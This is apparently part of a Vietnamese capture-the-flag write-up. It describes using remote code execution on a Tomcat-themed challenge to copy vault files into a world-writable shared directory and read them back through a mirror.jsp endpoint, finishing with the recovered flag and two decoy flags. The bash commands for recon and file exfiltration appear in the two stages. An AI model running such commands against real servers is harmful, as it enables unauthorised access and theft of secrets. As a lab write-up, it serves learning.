# 05 — Exfiltration qua mirror.jsp + Flag

## Cơ chế mirror

Entry 006: `/mirror.jsp?parcel=<label>` đọc file **trong `/opt/citadel/shared`** theo tên file.

- Parcels **one-shot** — mirror xóa ngay khi lấy (đọc 2 lần sẽ 404)
- Janitor quét sạch mọi thứ >15 phút trên shelf
- `?label=` → 400 "the mirror only serves parcels by label" (tên param là **`parcel`**)
- Label sai → 404 custom

## Chặng 1 — RCE ghi recon vào shelf

Command qua base64 wrapper (xem 03):

```bash
CMD='ls -laR /opt/citadel > /opt/citadel/shared/ls.txt 2>&1'
# generate + send như 04
curl "http://91.107.164.78:8080/mirror.jsp?parcel=ls.txt"
```

Kết quả `/opt/citadel`:

```
/opt/citadel/vault/          (root, không list được trực tiếp — nhưng...)
/opt/citadel/gate/
  -r--r--r-- launch_222152f22818.conf      ← label random hiện tại của gate

/opt/citadel/shared/         (world-writable)
  f1788019109_gate/launch_5ffefc6a6550.conf    ← player khác copy rồi
  f1788019109_vault/{flag.txt, pf_0fecc534a82f.asc, README}
  ... (mấy thư mục G, V, vcopy, g3... = dấu vết các player trước)
```

Quan trọng: **RCE chạy as `citadel`** nên đọc thẳng `/opt/citadel/vault/*` được (mode 0640 owner citadel) — không cần copy qua shared như các player trước.

## Chặng 2 — cat tất cả

```bash
CMD='cat /opt/citadel/shared/f1788019109_vault/flag.txt \
        /opt/citadel/shared/f1788019109_vault/README \
        /opt/citadel/shared/f1788019109_vault/pf_0fecc534a82f.asc \
        /opt/citadel/shared/f1788019109_gate/launch_5ffefc6a6550.conf \
        /opt/citadel/gate/launch_222152f22818.conf \
     > /opt/citadel/shared/flagout.txt 2>&1'
```

Output:

```
ASIS{do_you_think_rick_sanchez_is_stupid?}      ← vault/flag.txt  (42B)
nothing to see here, Morty.                     ← vault/README    (27B)
ASIS{t0McAT_was_Th3_KEY}                        ← vault/pf_*.asc  (15B) ★
_Th3_KEY}                                       ← gate/launch_*.conf (9B) — phần đuôi
```

## Flag

```
ASIS{t0McAT_was_Th3_KEY}
```

Nằm trong `pf_0fecc534a82f.asc` (portal-fluid key) ở vault. File `launch_*.conf` của gate chứa `_Th3_KEY}` — chính là nửa sau, khớp mô tả Entry 005 "launch codes are split". Ghép: `ASIS{t0McAT_was_Th3_KEY}`.

Hai decoy:
- `flag.txt` = `ASIS{do_you_think_rick_sanchez_is_stupid?}` — tên file đẹp nhưng nội dung châm chọc người lấy nhầm
- `README` = "nothing to see here, Morty."

`t0McAT` = tomato-cat (Entry 008 coffee stain "CVE-shaped doodle of a tomato-cat") = Tomcat — flag tự xác nhận CVE vector.
